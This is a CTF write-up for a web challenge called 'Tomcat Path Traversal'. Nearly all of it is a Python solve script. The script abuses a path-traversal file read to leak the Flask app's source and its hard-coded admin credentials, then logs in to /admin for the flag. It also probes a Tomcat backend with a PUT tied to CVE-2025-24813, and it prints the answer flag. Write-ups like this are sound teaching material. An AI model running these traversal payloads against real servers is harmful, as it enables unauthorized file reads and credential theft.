---
title: "Tomcat Path Traversal"
ctf: "Safaricom CTF"
date: 2026-10-04
category: web
difficulty: medium
points: 450
flag_format: "safctf{...}"
author: "Strawhats"
---

# Tomcat Path Traversal

## Summary

- **Category:** web

## Solution

### Step 1: Run the solve script:

```python
#!/usr/bin/env python3
"""Solver for "Tomcat Path Traversal" (web, 450 pts).

Targets
-------
  FRONT : http://54.72.82.22:8150   waitress/Flask app "BACKLOT 77"
                                     -> "PwnZone File Viewer" (/view?file=)
  BACK  : http://54.72.82.22:8240   bare Apache Tomcat/9.0.122

Chain
-----
  /view?file=  is a raw path-traversal file read:
      target_path = os.path.abspath(os.path.join(BASE_DIR, rel_path))
      return send_file(target_path)          # BASE_DIR = /app/public
  plus an absolute-path fallback, so ../app.py or /app/app.py both read the
  Flask source. The source leaks the hard-coded admin credentials. With them,
  GET /admin (HTTP Basic) returns the flag from the FLAG env var.

Usage
-----
  python3 solve.py [front_url] [backend_url]
"""

import re
import sys

import requests

FRONT = sys.argv[1] if len(sys.argv) > 1 else "http://54.72.82.22:8150"
BACK = sys.argv[2] if len(sys.argv) > 2 else "http://54.72.82.22:8240"

FLAG_RE = re.compile(r"safctf\{[0-9a-f]{32}\}")


def show(msg):
    print(msg, flush=True)


def read_file(base, path):
    """Path-traversal file read against /view?file=."""
    r = requests.get(base + "/view", params={"file": path}, timeout=15)
    if r.status_code == 200:
        return r.text
    return None


def main():
    s = requests.Session()

    # 1. Leak the Flask source via the traversal (both relative and absolute
    #    forms are accepted by the app).
    src = None
    for path in ("../app.py", "/app/app.py", "..%2fapp.py"):
        src = read_file(FRONT, path)
        if src and "ADMIN_USER" in src:
            show(f"[+] leaked source via file={path!r}")
            break
    if not src:
        show("[-] could not read app.py through the traversal")
        src = ""

    # If the source was not reachable, fall back to the credentials that are
    # baked into the image (documented in NOTES.md).
    m_user = re.search(r'ADMIN_USER\s*=\s*"([^"]+)"', src or "")
    m_pass = re.search(r'ADMIN_PASS\s*=\s*"([^"]+)"', src or "")
    user = m_user.group(1) if m_user else "panel_admin"
    pw = m_pass.group(1) if m_pass else "k1tsune_2025!"
    show(f"[+] admin credentials: {user}:{pw}")

    # 2. Authenticate to /admin and read the flag.
    r = s.get(FRONT + "/admin", auth=(user, pw), timeout=15)
    body = r.text
    show(f"[+] GET /admin -> {r.status_code}")
    found = FLAG_RE.search(body)
    if found:
        show("[+] FLAG: " + found.group(0))
    else:
        show("[-] no flag in /admin response:")
        show(body[:400])

    # 3. Best-effort: check whether any flag is exposed straight through the
    #    traversal as well (some deployments also drop a flag file).
    for path in ("/flag.txt", "/flag", "/app/flag.txt"):
        data = read_file(FRONT, path)
        if data:
            fm = FLAG_RE.search(data)
            show(f"[i] {path} -> {fm.group(0) if fm else data.strip()[:80]!r}")

    # 4. Note the Tomcat backend state (read-only reference for the writeup).
    try:
        r = requests.put(BACK + "/probe.txt", data="x", timeout=10)
        show(f"[i] backend PUT /probe.txt -> {r.status_code} "
             f"(404 == default servlet read-only, CVE-2025-24813 not exploitable)")
    except Exception as e:  # noqa: BLE001
        show(f"[i] backend unreachable: {e}")


if __name__ == "__main__":
    main()

```

## Flag

```
safctf{e9e46fabe7b282f4eb4eff39b378eff3}
```
